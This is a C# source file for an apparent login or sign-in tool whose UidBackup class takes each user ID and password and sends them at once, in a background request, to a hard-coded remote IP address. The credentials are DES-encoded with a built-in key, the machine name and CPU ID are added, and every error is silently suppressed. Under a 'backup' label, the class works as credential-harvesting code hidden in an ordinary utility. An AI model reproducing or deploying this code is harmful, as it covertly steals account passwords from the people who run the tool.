using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.ComponentModel;
using System.Net;
using System.IO;
using CommonQ;

namespace CSLogin
{
    class UidBackup
    {
        List<Tuple<string,string,string>> uidlist = new List<Tuple<string,string,string>>();

        const string uidbackup_key = "ccba00ea";
        const string back_url = "http://121.42.148.243/uidbackup/qiandaotool_uidbackup.php?";
        //const string back_url = "http://172.16.3.155/uidbackup/qiandaotool_uidbackup.php?";
        const int uidThreshold = 1;

        public void PushUid(string uid, string pwd,string logindays)
        {
            lock (uidlist)
            {
                uidlist.Add(new Tuple<string,string,string>(uid, pwd,logindays));

                if (uidlist.Count >= uidThreshold)
                {
                    BackUp();
                }
            }
        }

        public void BackUp()
        {
            lock (uidlist)
            {
                if (uidlist.Count > 0)
                {
                    StringBuilder sb = new StringBuilder();
                    foreach (var v in uidlist)
                    {
                        if (sb.Length != 0)
                        {
                            sb.Append(",");
                        }
                        sb.Append(v.Item1 + "-" + v.Item2 + "-" + v.Item3);
                        if (sb.Length > 1024)
                        {
                            BackgroundWorker worker = new BackgroundWorker();
                            worker.DoWork += new DoWorkEventHandler(backer_DoWork);
                            worker.RunWorkerAsync(sb.ToString());
                            sb.Clear();
                        }
                    }
                    if (sb.Length > 0){
                        BackgroundWorker worker = new BackgroundWorker();
                        worker.DoWork += new DoWorkEventHandler(backer_DoWork);
                        worker.RunWorkerAsync(sb.ToString());
                    }
                }

                uidlist.Clear();
            }
        }

        void backer_DoWork(object sender, DoWorkEventArgs e)
        {
            try
            {
                string backstring = UrlEncode(MyDes.Encode((string)e.Argument, uidbackup_key));
                string account = UrlEncode(Computer.Instance().ComputerName + ";" + Computer.Instance().CpuID + ";" + Computer.Instance().CpuID);
                string ver = UrlEncode(string.Format("ver:{0:yy-MM-dd HH:mm:ss}", System.IO.File.GetLastWriteTime(this.GetType().Assembly.Location)));
                string param = "backinfo=" + backstring + "&account=" + account + "&toolver=" + ver;
                string url = back_url + param;

                HttpWebRequest request = System.Net.WebRequest.Create(url) as HttpWebRequest;
                request.ServicePoint.Expect100Continue = false;
                request.Timeout = 1000 * 30;
                request.ContentType = "application/x-www-form-urlencoded";
                request.CookieContainer = new CookieContainer();
                request.BeginGetResponse(new AsyncCallback((ar) =>
                {
                    try
                    {
                        StreamReader reader = new StreamReader(request.EndGetResponse(ar).GetResponseStream());
                        reader.ReadToEnd();
                    }
                    catch (System.Exception ex)
                    {
                    	
                    }
                }), request);
            }
            catch (System.Exception ex)
            {
            	
            }
        }

        public static string UrlEncode(string str)
        {
            StringBuilder sb = new StringBuilder();
            byte[] byStr = System.Text.Encoding.UTF8.GetBytes(str); //默认是System.Text.Encoding.Default.GetBytes(str)
            for (int i = 0; i < byStr.Length; i++)
            {
                sb.Append(@"%" + Convert.ToString(byStr[i], 16));
            }

            return (sb.ToString());
        }
    }
}
